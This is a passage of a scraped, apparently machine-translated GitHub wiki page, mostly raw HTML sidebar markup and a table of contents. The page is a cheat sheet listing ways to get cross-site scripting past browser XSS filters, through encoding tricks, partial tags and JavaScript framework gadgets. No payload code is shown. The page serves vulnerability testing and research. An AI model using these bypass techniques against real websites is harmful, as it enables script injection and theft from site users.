href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#%E9%81%8E%E5%8E%BB%E3%81%AE%E3%83%90%E3%82%A4%E3%83%91%E3%82%B9" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">past bypass</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 0px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#ieedge%E3%81%AExss%E3%83%95%E3%82%A3%E3%83%AB%E3%82%BF%E3%83%BC" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">XSS filter for IE/Edge</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 12px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#%E9%81%AE%E6%96%AD%E5%AF%BE%E8%B1%A1%E3%81%A7%E3%81%AA%E3%81%84%E3%82%82%E3%81%AE-1" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">Items not subject to blocking</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 24px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#%E6%96%87%E5%AD%97%E5%88%97%E3%83%AA%E3%83%86%E3%83%A9%E3%83%AB%E3%81%A7%E8%B5%B7%E3%81%93%E3%82%8Bxss-1" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">XSS happening in string literals</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 24px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#%E5%85%A8%E3%81%A6%E3%81%AEdom-based-xss" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">All DOM based XSS</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 24px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#1%E3%83%9A%E3%83%BC%E3%82%B8%E3%81%AB2%E3%81%A4%E4%BB%A5%E4%B8%8A%E3%81%AE%E6%B3%A8%E5%85%A5%E7%82%B9%E3%81%8C%E3%81%82%E3%82%8Bxss" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">XSS with 2 or more injection points on one page</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 24px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#%E6%96%87%E5%AD%97%E5%88%97%E3%81%AE%E6%93%8D%E4%BD%9C%E3%81%8C%E3%81%82%E3%82%8B%E5%A0%B4%E5%90%88-1" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">If you have string operations</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 36px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#%E5%89%8A%E9%99%A4%E3%81%95%E3%82%8C%E3%82%8B%E5%A0%B4%E5%90%88-1" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">When deleted</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 36px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#%E7%BD%AE%E6%8F%9B%E3%81%95%E3%82%8C%E3%82%8B%E5%A0%B4%E5%90%88-1" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">When replaced</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 24px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#%E5%A4%96%E9%83%A8%E3%81%AB%E3%83%AA%E3%82%AF%E3%82%A8%E3%82%B9%E3%83%88%E3%82%92%E9%80%81%E4%BF%A1%E3%81%A7%E3%81%8D%E3%82%8B%E3%82%BF%E3%82%B0-1" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">Tags that can send requests to the outside</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 12px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#%E3%83%90%E3%82%A4%E3%83%91%E3%82%B9-1" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">bypass</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 24px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#xml-namespace%E3%81%AB%E5%81%BD%E8%A3%85%E3%81%97%E3%81%9F%E6%96%87%E5%AD%97%E5%88%97%E3%81%AE%E5%88%A9%E7%94%A8edge%E3%81%AE%E3%81%BF" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">Using strings disguised as XML namespaces (Edge only)</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 24px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#hz-gb-2312%E3%81%AE%E3%82%A8%E3%82%B9%E3%82%B1%E3%83%BC%E3%83%97%E3%82%B7%E3%83%BC%E3%82%B1%E3%83%B3%E3%82%B9%E3%81%AE%E5%88%A9%E7%94%A8" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">Using HZ-GB-2312 Escape Sequences</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 24px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#%E3%83%8A%E3%83%93%E3%82%B2%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E6%99%82%E3%81%AE%E3%82%A8%E3%83%B3%E3%82%B3%E3%83%BC%E3%83%89%E5%8B%95%E4%BD%9C%E3%81%AE%E5%88%A9%E7%94%A8" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">Using encoding behavior when navigating</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 24px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#adobe-acrobat-reader%E3%83%97%E3%83%A9%E3%82%B0%E3%82%A4%E3%83%B3%E3%81%AE%E5%88%A9%E7%94%A8ie%E3%81%AE%E3%81%BF" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">Using the Adobe Acrobat Reader plug-in (IE only)</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 24px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#xml%E3%81%B8%E3%81%AEcontent-sniffing%E3%81%AE%E5%88%A9%E7%94%A8ie%E3%81%AE%E3%81%BF" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">Using Content Sniffing for XML (IE Only)</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 24px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#utf-7-bom%E3%81%AE%E5%88%A9%E7%94%A8ie%E3%81%AE%E3%81%BF" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">Use UTF-7 BOM (IE only)</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 24px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#pxml%E3%81%AE%E5%88%A9%E7%94%A8ie%E3%81%AE%E3%81%BF" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">Using &lt;?PXML&gt; (IE only)</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 24px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#%E3%83%AA%E3%83%95%E3%82%A1%E3%83%A9%E3%81%AE%E5%88%A9%E7%94%A8" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">Use of referrer</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 36px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#%E5%90%8C%E3%81%98%E3%83%89%E3%83%A1%E3%82%A4%E3%83%B3%E3%82%B5%E3%83%96%E3%83%89%E3%83%A1%E3%82%A4%E3%83%B3%E3%82%82%E5%90%AB%E3%82%80%E5%86%85%E3%81%AB%E3%81%82%E3%82%8B%E3%83%AA%E3%83%B3%E3%82%AF%E6%A9%9F%E8%83%BD%E3%81%AE%E5%88%A9%E7%94%A8" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">Use of link functions within the same domain (including subdomains)</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 36px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#%E4%BB%BB%E6%84%8F%E3%81%AEurl%E3%82%92%E6%8C%87%E5%AE%9A%E3%81%A7%E3%81%8D%E3%82%8B%E7%AE%87%E6%89%80%E3%81%A7%E3%81%AE%E3%83%90%E3%82%A4%E3%83%91%E3%82%B9" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">Bypass where arbitrary URL can be specified</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 36px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#%E8%84%86%E5%BC%B1%E3%81%AAform%E3%81%B8%E3%81%AE%E9%80%81%E4%BF%A1%E5%89%8D%E3%81%AE%E7%8A%B6%E6%85%8B%E3%82%92%E3%83%9A%E3%83%BC%E3%82%B8%E4%B8%8A%E3%81%AB%E7%B6%AD%E6%8C%81%E3%81%A7%E3%81%8D%E3%82%8B%E5%A0%B4%E5%90%88" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">If the state before submission to the vulnerable form can be maintained on the page</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 36px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#option%E3%82%BF%E3%82%B0%E3%81%AE%E5%88%A9%E7%94%A8" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">Using option tags</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 36px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#%E7%A9%BA%E3%81%AEiframe%E3%81%AE%E5%88%A9%E7%94%A8" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">Using an empty iframe</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 24px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#formaction%E3%81%AE%E5%88%A9%E7%94%A8%E6%83%85%E5%A0%B1%E3%81%AE%E5%8F%96%E5%BE%97%E3%81%AE%E3%81%BF" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">Using formaction (getting information only)</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 24px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#style%E3%81%A7%E3%81%AE%E6%96%87%E5%AD%97%E5%8F%82%E7%85%A7%E5%8C%96%E3%81%97%E3%81%9F%E6%96%87%E5%AD%97%E5%88%97%E3%81%AE%E5%88%A9%E7%94%A8style%E3%81%AE%E8%A8%98%E8%BF%B0%E3%81%AE%E3%81%BF" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">Use of character-referenced strings in style (style description only)</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 12px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#%E9%81%8E%E5%8E%BB%E3%81%AE%E3%83%90%E3%82%A4%E3%83%91%E3%82%B9-1" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">past bypass</font></font></a></li></ul></details>

- <details class="details-reset" style="box-sizing: border-box; display: block;"><summary style="box-sizing: border-box; display: list-item; cursor: pointer; list-style: none; transition: color 80ms cubic-bezier(0.33, 1, 0.68, 1) 0s, background-color, box-shadow, border-color;"><div class="d-flex flex-items-start" style="box-sizing: border-box; align-items: flex-start !important; display: flex !important;"><div class="p-2 mt-n1 mb-n1 ml-n1 btn btn-octicon js-wiki-sidebar-toc-toggle-chevron-button " style="box-sizing: border-box; position: relative; display: inline-block; padding: 8px !important; font-size: 14px; font-weight: 500; line-height: 1; white-space: nowrap; vertical-align: middle; cursor: pointer; user-select: none; border: 0px; border-radius: 6px; appearance: none; color: var(--color-fg-muted); background: transparent; box-shadow: none; transition: color 80ms cubic-bezier(0.33, 1, 0.68, 1) 0s, background-color, box-shadow, border-color; margin-left: -4px !important; margin-top: -4px !important; margin-bottom: -4px !important;"><svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-triangle-down js-wiki-sidebar-toc-toggle-chevron  mr-0"><path d="M4.427 7.427l3.396 3.396a.25.25 0 00.354 0l3.396-3.396A.25.25 0 0011.396 7H4.604a.25.25 0 00-.177.427z"></path></svg></div><a class="flex-1 py-1 text-bold" href="https://github.com/masatokinugawa/filterbypass/wiki/Fixed-Bypass-Archive" style="box-sizing: border-box; background-color: transparent; color: var(--color-accent-fg); text-decoration: none; flex-grow: 1 !important; flex-shrink: 1 !important; flex-basis: 0%; padding-top: 4px !important; padding-bottom: 4px !important; font-weight: 600 !important;">Fixed Bypass Archive</a></div></summary></details>

##### Clone this wiki locally



This page summarizes XSS Auditor and XSS filter bypass. Content that runs on the latest versions of Chrome/Safari and IE11/Edge is eligible. If you're a vulnerability diagnostician, let us help you convincingly prove that an attack is possible, and if you're a security researcher, help us find more bypasses. What I'm listing is what can be bypassed in common situations. Just because a method isn't listed here doesn't mean it can't be abused in real-world situations. Regardless of whether it can be bypassed or not, it's always a good idea to do some underlying XSS mitigation.

# table of contents

- XSS Auditor
  - Items not subject to blocking
    - [XSS happening in string literals](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#文字列リテラルで起こるxss)
    - [XSS established by URL alone (such as when the input value is directly entered in the href part of the a tag)](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#url単独で成立するxss入力値が直接aタグのhref部分に入る場合など)
    - [If you have 2 or more injection points](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#2つ以上の注入ポイントがある場合)
    - If you have string operations
      - [When deleted](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#削除される場合)
      - [When replaced](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#置換される場合)
    - [DOM based XSS other than document.write() the request string](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#リクエスト文字列をdocumentwriteするもの以外のdom-based-xss)
    - [XSS in XML pages](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#xmlページでのxss)
    - [http(s): create link](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#httpsリンクの作成)
    - [Tags that can send requests to the outside](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#外部にリクエストを送信できるタグ)
    - [Arbitrary CSS description](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#任意のcssの記述)
  - bypass
    - [Using the SVG animation values attribute (Safari only)](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#svgアニメーションのvalues属性の利用safariのみ)
    - [Using multiple null characters (Safari only)](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#複数のnull文字の利用safariのみ)
    - [Using comments with --> in script tags (Safari only)](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#scriptタグ内の--によるコメントの利用safariのみ)
    - Using half-baked base tags (Safari only)
      - [Use of Flash](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#flashの利用)
      - [Using scripts loaded with relative URLs](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#相対urlでロードしているスクリプトの利用)
    - [Use of ISO-2022-JP escape sequences](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#iso-2022-jpのエスケープシーケンスの利用)
    - Use of resources in the same domain
      - [Case with XSS in path (Chrome only)](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#パスにxssがあるケースchromeのみ)
      - [File upload function](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#ファイルのアップロード機能)
      - [Using Flash and flashvars](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#flashとflashvarsの利用)
      - [Using Flash's ExternalInterface.objectID and ExternalInterface.call()](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#flashのexternalinterfaceobjectidとexternalinterfacecallの利用)
      - [Using Angular](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#angularの利用)
      - [Using Vue.js](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#vuejsの利用)
      - [Using jQuery](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#jqueryの利用)
      - [Using underscore.js](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#underscorejsの利用)
      - [Using JSX transformation scripts such as JSXTransformer/babel-standalone](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#jsxtransformerbabel-standaloneなどのjsx変換スクリプトの利用)
    - [Use odd tags when document.write() (Chrome only)](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#documentwrite時に半端なタグを利用するchromeのみ)
    - [Using half-baked form tags (getting information only) (Safari only)](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#半端なformタグの利用情報の取得のみsafariのみ)
  - [past bypass](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#過去のバイパス)
- XSS filter for IE/Edge
  - Items not subject to blocking
    - [XSS happening in string literals](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#文字列リテラルで起こるxss-1)
    - [All DOM based XSS](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#全てのdom-based-xss)
    - [XSS with 2 or more injection points on one page](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#1ページに2つ以上の注入点があるxss)
    - If you have string operations
      - [When deleted](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#削除される場合-1)
      - [When replaced](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#置換される場合-1)
    - [Tags that can send requests to the outside](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#外部にリクエストを送信できるタグ-1)
  - bypass
    - [Using strings disguised as XML namespaces (Edge only)](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#xml-namespaceに偽装した文字列の利用edgeのみ)
    - [Using HZ-GB-2312 Escape Sequences](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#hz-gb-2312のエスケープシーケンスの利用)
    - [Using encoding behavior when navigating](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#ナビゲーション時のエンコード動作の利用)
    - [Using the Adobe Acrobat Reader plug-in (IE only)](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#adobe-acrobat-readerプラグインの利用ieのみ)
    - [Using Content Sniffing for XML (IE Only)](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#xmlへのcontent-sniffingの利用ieのみ)
    - [Use UTF-7 BOM (IE only)](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#utf-7-bomの利用ieのみ)
